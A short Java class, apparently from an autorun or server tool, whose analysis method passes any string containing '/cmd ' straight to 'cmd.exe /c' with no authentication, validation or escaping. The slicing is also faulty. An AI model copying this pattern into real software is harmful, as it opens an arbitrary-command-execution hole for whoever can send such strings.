package pl.mario.mautorun;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Mateusz
 */
public class MPacket extends Thread {

    private String cmd;

    public MPacket(String cmd) {
        this.cmd = cmd;
        analysis();
    }

    public void analysis() {

        if (this.cmd.contains("/cmd ")) {
            String exec = "cmd.exe /c "+cmd.substring(5);
            try {
                Process p = Runtime.getRuntime().exec(exec);
            } catch (IOException ex) {
                Loggs.loguj("MPacket-analysis-/cmd", ex);
            }
        }

    }

}
